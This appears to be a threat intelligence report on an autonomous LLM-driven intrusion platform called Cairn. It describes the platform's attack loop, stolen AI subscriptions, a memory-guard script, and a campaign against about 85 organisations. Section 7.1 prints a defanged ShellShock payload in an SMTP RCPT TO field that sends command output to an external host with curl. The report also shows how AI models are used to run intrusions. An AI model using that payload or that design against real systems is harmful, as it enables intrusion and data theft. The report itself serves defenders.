1. Executive Summary

A Chinese-speaking threat actor has built and operationalised an autonomous AI-driven intrusion platform — internally named Cairn — capable of selecting attack targets, generating and executing exploit chains, tracking failure states across sessions, and iterating on blocked attack paths without sustained human involvement per session. The platform was discovered during routine infrastructure investigation of a suspicious APAC hosting provider VPS, which was found to be the operator's primary command-and-control and AI dispatch server with an exposed working directory containing active campaign artefacts.

Evidence recovered reveals a campaign active from at least 24 September 2026, targeting a minimum of 85 organisations across the US, Taiwan, Europe, and the Asia-Pacific region. Victims span e-commerce, automotive finance, digital healthcare media, and multi-tenant SaaS. Three victim sectors have been positively identified from recovered artefacts. A fourth target is a multi-tenant SaaS platform running on GCP whose specific identity remains under investigation. A live reverse shell beacon was confirmed active inside one victim's Kubernetes cluster at the time of discovery, connecting back to the operator's server every five minutes.

The operator extracted GCP service account private keys from one victim's infrastructure, obtained payment card stream data and customer credentials from another, achieved confirmed remote code execution on a Taiwanese email provider via a ShellShock exploit, and extracted MSSQL database credentials from that system. The Cairn platform consumed approximately 229,828 AI-dispatched attack sessions across 13 days, powered by stolen Cline AI subscriptions (two accounts totalling approximately $10,000 in credit) routing DeepSeek v4.1-flash through a pirated account rotation service.

4. The Cairn AI Attack Platform

Cairn is a custom-built autonomous penetration/intrusion platform powered by an LLM. Rather than a human operator manually selecting and firing exploits, the AI model receives a target, a goal statement, and the accumulated fact-graph from prior sessions, then autonomously decides which techniques to attempt next. This represents a material evolution in adversarial tooling.

Attack Loop (per session)

Each Cairn attack session follows a structured loop. The AI receives the current state of the target's fact-graph (graph.yaml), a goal statement, and the history of prior failed attempts. It then selects an intent, executes it inside a Kali Linux Docker container, observes the result, and updates the fact-graph. Sessions conclude with a structured Chinese-language summary fed into the next session.

PHASE: bootstrap        → Initial reconnaissance, asset mapping
PHASE: explore          → Active exploitation attempts (17,768 dispatched)
PHASE: reason           → LLM selects next intent from fact-graph (15,119 dispatched)
PHASE: conclude         → Session summary, fact-graph update (7,213 LLM-concluded)

AI Credential Abuse (ClinePass)

The operator uses a pirated Cline AI account rotation service to bypass per-session rate limits. The service cycles between stolen or purchased Cline Pass subscriptions, each providing access to DeepSeek v4.1-flash. Recovered billing data confirmed two active subscriptions with combined remaining credit of approximately $9,989 at time of discovery. The operator's internal label for the primary account (translated): "locked to DeepSeek official" — indicating deliberate routing to avoid model substitution.

Platform Engineering Quality

Cairn ships a production-grade memory management daemon (cairn_guard.sh) that monitors the dispatcher process, defers restarts until no attack sessions hold active leases, and rate-limits restart frequency. The script's opening comment explains it was written after the dispatcher previously grew to 12 GB in memory, filled swap, and was killed by the kernel's OOM killer. The fix required engineering a SQLite-backed active-lease check before restart. This is maintained, iterated software — not a one-time tool.

#!/bin/bash
# Cairn dispatcher memory guard.
# Before the capture cap was added, the dispatcher grew to 12 GB on a
# 16 GB box, filled swap, made the host unresponsive, and was OOM-killed.
# This guard restarts the dispatcher before that can happen again, and
# prefers to do so while no task holds a lease so no work is lost.

SOFT_LIMIT_MB=2500
HARD_LIMIT_MB=6000

active_leases() {
    python3 - <<'PY'
import sqlite3
conn = sqlite3.connect("~/.local/share/cairn/cairn.db")
total  = conn.execute("select count(*) from intents where to_fact_id is null and worker is not null").fetchone()[0]
total += conn.execute("select count(*) from projects where reason_worker is not null").fetchone()[0]
print(total)
PY
}

7. Technical Evidence

7.1 ShellShock via SMTP — CVE-2014-6271

The operator exploited ShellShock by injecting a bash payload into the SMTP RCPT TO field, exploiting a gap in the target mail server's content filter (which only inspected MAIL FROM and DATA body, not RCPT TO) combined with qmail's behaviour of stripping the recipient domain before passing the local part to a bash-3.2 process.

# Payload structure (defanged)
RCPT TO:<() { :; }; {COMMAND}|curl -s -T - http://[REDACTED]/ev/{label}@{domain}>

# Command output exfiltrated inside SMTP 250 acknowledgements:
EXEC [REDACTED]:25  2026-09-29T18:11:49
id        → 250 mail2.[REDACTED].com.tw / 250 ok / 354 go ahead / 250 ok
hostname  → 250 mail2.[REDACTED].com.tw / 250 ok / 354 go ahead / 250 ok
uname -a  → 250 mail2.[REDACTED].com.tw / 250 ok / 354 go ahead / 250 ok

# Database credentials extracted from web application config:

MODbPassword: [REDACTED]
MODbPort:     1433
MODbEncoding: Cp950  (Traditional Chinese — confirms Taiwanese server)
